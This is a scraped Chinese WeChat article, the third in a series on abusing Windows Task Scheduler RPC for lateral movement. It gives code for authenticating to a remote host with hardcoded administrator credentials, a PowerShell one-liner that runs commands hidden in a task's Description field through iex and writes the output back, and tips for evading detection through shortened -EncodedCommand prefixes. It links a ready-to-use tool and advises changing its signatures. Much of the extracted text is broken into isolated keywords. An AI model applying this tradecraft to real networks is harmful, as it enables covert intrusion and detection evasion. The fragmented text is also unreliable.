{"id": "825289917", "title": "Advanced Windows Task Scheduler Playbook-Part.3 Lateral Movement", "url": "https://mp.weixin.qq.com/s?__biz=MzA5MjEyMDIxNg==&mid=2247483683&idx=1&sn=6960b2dd90c0789d67d8415b0e8dd593", "accountName": "头像哥老草", "author": "头像哥老草", "date": "9月27日", "ts": 1664317800000, "cover": "https://mmbiz.qpic.cn/sz_mmbiz_jpg/fW0qCGlxj6tQafZiaPsqgMGxIe3Aw9cvBHKGlaoeK8lA4yicmFdibye7YUYZFo4fVmDM66ZLb44Q6ScHq5HWf0Ghw/0?wx_fmt=jpeg", "summary": "原创 zcgonvh 2022-09-28 06:30 北京 \nAdvanced Windows Task Scheduler Playbook - Part.3 from RPC to lateral movement\nAdvanced Windows Task Scheduler Playbook - Part.3 from RPC to lateral movement\n0x00 问题\n书接", "content": [{"type": "p", "text": "原创 zcgonvh 2022-09-28 06:30 北京"}, {"type": "p", "text": "Advanced Windows Task Scheduler Playbook - Part.3 from RPC to lateral movement"}, {"type": "img", "src": "https://mmbiz.qpic.cn/sz_mmbiz_jpg/fW0qCGlxj6tQafZiaPsqgMGxIe3Aw9cvBHKGlaoeK8lA4yicmFdibye7YUYZFo4fVmDM66ZLb44Q6ScHq5HWf0Ghw/0?wx_fmt=jpeg", "caption": "", "_imgCount": 1}, {"type": "h", "text": "Advanced Windows Task Scheduler Playbook - Part.3 from RPC to lateral movement"}, {"type": "h", "text": "0x00 问题"}, {"type": "p", "text": "COM"}, {"type": "img", "src": "https://mmbiz.qpic.cn/sz_mmbiz_png/fW0qCGlxj6tQafZiaPsqgMGxIe3Aw9cvB0SxMJQ3TU6DkW5TBMnNQQIHKELoiaN1MDfIzwHj5MIbEc9LvxibRzJmQ/640?wx_fmt=png", "caption": "", "_imgCount": true}, {"type": "p", "text": "UAC"}, {"type": "p", "text": "ITaskService"}, {"type": "p", "text": "XML"}, {"type": "img", "src": "https://mmbiz.qpic.cn/sz_mmbiz_png/fW0qCGlxj6tQafZiaPsqgMGxIe3Aw9cvBGg0bkI1xu1uI1ZZxRGic67pz4UB1q92E5I3bMD9KgEaWa5qPX3PvV6w/640?wx_fmt=png", "caption": "", "_imgCount": true}, {"type": "p", "text": "RPC"}, {"type": "p", "text": "atexec"}, {"type": "p", "text": "schtasks"}, {"type": "img", "src": "https://mmbiz.qpic.cn/sz_mmbiz_png/fW0qCGlxj6tQafZiaPsqgMGxIe3Aw9cvBnlJbGkODjCkicJuRnOBAxrWzXHxWarM7944Td5BBjmMHdickuG3XtPog/640?wx_fmt=png", "caption": "", "_imgCount": true}, {"type": "p", "text": "at.exe"}, {"type": "p", "text": "而在实战中，这些或多或少会遇到一些问题。例如文件回显的技巧可能面临共享无法访问、SMB协议不兼容等诸多非常规环境；除了环境限制的因素之外，对抗环境下更多时候还要面临“已知”带来的威胁：一个已知的攻击方式或手法，一定有对应的检测。"}, {"type": "p", "text": "这也就进一步导致了一个很实际的问题："}, {"type": "img", "src": "https://mmbiz.qpic.cn/sz_mmbiz_png/fW0qCGlxj6tQafZiaPsqgMGxIe3Aw9cvBu48diaffLs8jXk2ibSVicnHMQblSf7RGPiaXxxLHLuQicJdtFJ4Bh2pv73g/640?wx_fmt=png", "caption": "", "_imgCount": true}, {"type": "p", "text": "工具也好，武器也好，平台也罢，无论在理论环境下运行的多么完美，实战环境下总可能“不那么好用”。"}, {"type": "p", "text": "探究新方法永远是对抗的第一课题。现在， 基于实战环境下的需要 ，我们为自己找了一个新课题：如何实现更为稳定的横移回显/环境探测？"}, {"type": "h", "text": "0x01 思考"}, {"type": "img", "src": "https://mmbiz.qpic.cn/sz_mmbiz_png/fW0qCGlxj6tQafZiaPsqgMGxIe3Aw9cvBe8PWSc7VWaB1NH5hMOEbLffDAVOuUV8ZJ1KZx0kYa0Sibn2Bxp8nKLQ/640?wx_fmt=png", "caption": "", "_imgCount": true}, {"type": "p", "text": "安全研究绝不是盲目 地 解决问题。 在这里，我们的最终目的是探索一个（某些环境下）相对更好的横向移动技术，技术问题往往能够很容易的分解为多个递进的步骤，所以可以继续细化一些："}, {"type": "p", "text": "横向移动存在哪些阶段？每个阶段中分别涉及哪些技术？每个技术细节存在哪些优劣？"}, {"type": "p", "text": "顺着这样的思路来思考，就会带出下面的技术细节："}, {"type": "p", "text": "横向移动需要连接到目标，在网络层面则表现为协议，那么第一个子问题就是："}, {"type": "p", "text": "采用什么协议？"}, {"type": "p", "text": "滥用"}, {"type": "p", "text": "成功获取执行权限后，实战环境下往往需要一个结果反馈，我们得到第三个子问题： 服务本身是否可以直接返回结果？如果不支持，那么需要额外采用哪些手段？"}, {"type": "p", "text": "最后，则是实战环境经久不衰的老问题： 上述方式实现是否存在已知的特征？"}, {"type": "p", "text": "反序列化链/ROP"}, {"type": "p", "text": "Chain"}, {"type": "p", "text": "Gadget"}, {"type": "p", "text": "黑名单"}, {"type": "p", "text": "看，威胁情报和安全研究串起来了，Web和对抗也有了联系。"}, {"type": "p", "text": "考虑到我们正在研究计划任务，那么随之思考： 计划任务能否做到这一点？ 根据我们前两篇文章的研究结果，不难回答这一问题："}, {"type": "p", "text": "MS-TSCH"}, {"type": "p", "text": "RPC"}, {"type": "p", "text": "ExecAction"}, {"type": "p", "text": "ComHandlerAction"}, {"type": "p", "text": "UTF-16"}, {"type": "p", "text": "完整的"}, {"type": "p", "text": "原样"}, {"type": "p", "text": "Description"}, {"type": "p", "text": "无限制"}, {"type": "p", "text": "字符串"}, {"type": "p", "text": "UUID"}, {"type": "p", "text": "白名单"}, {"type": "p", "text": "ExecAction"}, {"type": "p", "text": "无文件"}, {"type": "p", "text": "ComHandlerAction"}, {"type": "p", "text": "写入文件"}, {"type": "p", "text": "注册表"}, {"type": "p", "text": "所以我们的表格可以添加下面并列的两项："}, {"type": "p", "text": "ExecAction"}, {"type": "p", "text": "ComHandlerAction"}, {"type": "p", "text": "横向移动"}, {"type": "p", "text": "无文件攻击对抗"}, {"type": "p", "text": "而这项至少十年的技术利用方式非常成熟，变换手段非常多样化，也就意味着我们拥有很多顺畅的实现方式。在当前场景下，我们需要利用无文件攻击执行命令或进行信息探测，并在随后修改计划任务信息作为返回。"}, {"type": "p", "text": "mshta"}, {"type": "p", "text": "sct"}, {"type": "p", "text": "xslt"}, {"type": "p", "text": "cmd"}, {"type": "p", "text": "PowerShell"}, {"type": "p", "text": "cmd"}, {"type": "p", "text": "Windows Script Hosting"}, {"type": "p", "text": "PowerShell"}, {"type": "h", "text": "0x02 实现"}, {"type": "p", "text": "确认了技术要点，实现起来就完全没难度了。"}, {"type": "p", "text": "MSDN"}, {"type": "p", "text": "IDL"}, {"type": "p", "text": "C# Interop"}, {"type": "p", "text": "Binding"}, {"type": "p", "text": "RpcBindingSetAuthInfoEx"}, {"type": "p", "text": "_SEC_WINNT_AUTH_IDENTITY identity = { 0 };LPWSTR domain = L \"ROOT\" ;LPWSTR username = L \"administrator\" ;LPWSTR password = L \"P@ssw0rd\" ;identity.Domain = ( unsigned short * )domain;identity.DomainLength = lstrlenW (domain);identity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;identity.User = ( unsigned short * )username;identity.UserLength = lstrlenW (username);identity.Password = ( unsigned short * )password;identity.PasswordLength = lstrlenW (password); RpcBindingSetAuthInfoExW (hBinding, 0 , RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, & identity, 0 , (RPC_SECURITY_QOS * ) & qos);"}, {"type": "p", "text": "ITaskService::Connect"}, {"type": "p", "text": "pService -> Connect ( _variant_t (L \"Target\" ), _variant_t (L \"administrator\" ), _variant_t (L \"ROOT\" ), _variant_t ( \"P@ssw0rd\" ));"}, {"type": "p", "text": "（体会到 抽象"}, {"type": "p", "text": "透明"}, {"type": "p", "text": "Get-ScheduledTask"}, {"type": "p", "text": "Set-ScheduledTask"}, {"type": "p", "text": "Cmdlet"}, {"type": "p", "text": "$task= Get-ScheduledTask - TaskName TestTask - TaskPath \\;$task.Description=( iex $task.Description| out-string ); Set-ScheduledTask $task;"}, {"type": "p", "text": "Get-ScheduledTask"}, {"type": "p", "text": "iex"}, {"type": "p", "text": "Description"}, {"type": "p", "text": "out-string"}, {"type": "p", "text": "XML"}, {"type": "p", "text": "/Task/RegistrationInfo/Description"}, {"type": "p", "text": "TestTask"}, {"type": "p", "text": "Description"}, {"type": "p", "text": "Description"}, {"type": "p", "text": "var xd=new XmlDocument();xd.LoadXml(task.Xml);Console.WriteLine(xd.SelectSingleNode(\"/*[local-name()='Task']/*[local-name()='RegistrationInfo']/*[local-name()='Description']\").InnerText);"}, {"type": "h", "text": "0x03 打磨"}, {"type": "p", "text": "通过上面思考至落地的过程，我们有了一个可执行、有效果的技术原型，接下来进行打磨，使之更贴近实战“武器”的状态。"}, {"type": "p", "text": "ExecAction"}, {"type": "p", "text": "-EncodedCommand"}, {"type": "p", "text": "opsec"}, {"type": "p", "text": "根据前缀"}, {"type": "p", "text": "不区分大小写"}, {"type": "p", "text": "-EncodedCommand"}, {"type": "p", "text": "-e"}, {"type": "p", "text": "-enc"}, {"type": "p", "text": "-eN-eNCo-Encode...."}, {"type": "p", "text": "-NonInteractive"}, {"type": "p", "text": "-nonInt-nOnInTe...."}, {"type": "p", "text": "对付一些没有词法分析的常规防御手段，这些基本上足够了。"}, {"type": "p", "text": "接下来，由于我们在进行横向移动，所以并不能确定命令在目标环境的执行时间，所以需要加一个轮询。"}, {"type": "p", "text": "睿智地"}, {"type": "p", "text": "脚本出错"}, {"type": "p", "text": "IRegisteredTask"}, {"type": "p", "text": "State"}, {"type": "p", "text": "Running"}, {"type": "p", "text": "Ready"}, {"type": "p", "text": "while (task.State != TaskState.Ready){ task = folder.GetTask(taskname); Thread.Sleep(1000);}"}, {"type": "p", "text": "opsec"}, {"type": "p", "text": "下载执行"}, {"type": "p", "text": "唯一"}, {"type": "p", "text": "Description"}, {"type": "p", "text": "对象"}, {"type": "p", "text": "内存"}, {"type": "p", "text": "Xml"}, {"type": "p", "text": "“强特征”"}, {"type": "p", "text": "iex"}, {"type": "p", "text": "返回"}, {"type": "p", "text": "命令"}, {"type": "p", "text": "iex"}, {"type": "p", "text": "远程PowerShell"}, {"type": "p", "text": "WinRM"}, {"type": "p", "text": "命令行程序"}, {"type": "p", "text": "Cmdlet"}, {"type": "p", "text": "脚本"}, {"type": "p", "text": ".Net"}, {"type": "p", "text": "远程（Remotly）"}, {"type": "p", "text": "无文件（fileless）"}, {"type": "p", "text": "无感知（undetectable）"}, {"type": "p", "text": "MS-TSCH"}, {"type": "p", "text": "交互式（Interactive）"}, {"type": "p", "text": "（为什么上面说可能脚本出错？这里就是了）"}, {"type": "h", "text": "0x04 反思"}, {"type": "p", "text": "至此，和计划任务相关的内容基本结束了。接下来我们跳出计划任务角度，站在应用场景的角度来回顾曾经我们可用的方案。一方面做个简单的总结，另一方面，想一想如何合理的进行使用。"}, {"type": "p", "text": "PsExec"}, {"type": "p", "text": "WMI"}, {"type": "p", "text": "SMB"}, {"type": "p", "text": "Impacket"}, {"type": "p", "text": "API"}, {"type": "p", "text": "WmiExec"}, {"type": "p", "text": "stdregprov"}, {"type": "p", "text": "DCOM"}, {"type": "p", "text": "基于RPC的taskexec"}, {"type": "p", "text": "为什么？"}, {"type": "p", "text": "应用范围/环境要求"}, {"type": "p", "text": "强特征"}, {"type": "p", "text": "undetectable"}, {"type": "p", "text": "bypass"}, {"type": "p", "text": "evasion"}, {"type": "p", "text": "强特征"}, {"type": "p", "text": "某一技术与其变种"}, {"type": "p", "text": "人为"}, {"type": "p", "text": "钓鱼的"}, {"type": "p", "text": "钓鱼佬"}, {"type": "p", "text": "mshta"}, {"type": "p", "text": "sct"}, {"type": "p", "text": "ComHandler"}, {"type": "p", "text": "基于任务计划的横向移动"}, {"type": "p", "text": "chain"}, {"type": "p", "text": "对抗-内网渗透-域-RPC"}, {"type": "h", "text": "0x05 总结"}, {"type": "p", "text": "这是本系列第三篇，我们从应用场景入手，随后进行可行性分析，接下来根据分析的内容进行原型实验，最后结合实战经验，打磨出一个全新的横向移动工具。"}, {"type": "p", "text": "精通"}, {"type": "p", "text": "掌握"}, {"type": "p", "text": "Gadget储备"}, {"type": "p", "text": "经验"}, {"type": "p", "text": "动态地"}, {"type": "p", "text": "Chain"}, {"type": "p", "text": "实战应用应当是知识的有机组合，不存在一劳永逸绝对成功的技巧，但知识的积累与理解能让我们更加轻松。"}, {"type": "p", "text": "当然，如果你就是喜欢无脑12345，那权当我什么都没说"}, {"type": "p", "text": "文章中的代码可以在 https://github.com/zcgonvh/TaskSchedulerMisc/ 找到，这次是一个没什么坑的原型，可以直接用，但最好自行修改一些特征防止撞车。"}, {"type": "p", "text": "还是那句话，希望这篇文章能在技术点之外为各位带来启发。"}, {"type": "p", "text": "跳转微信打开"}], "body": null}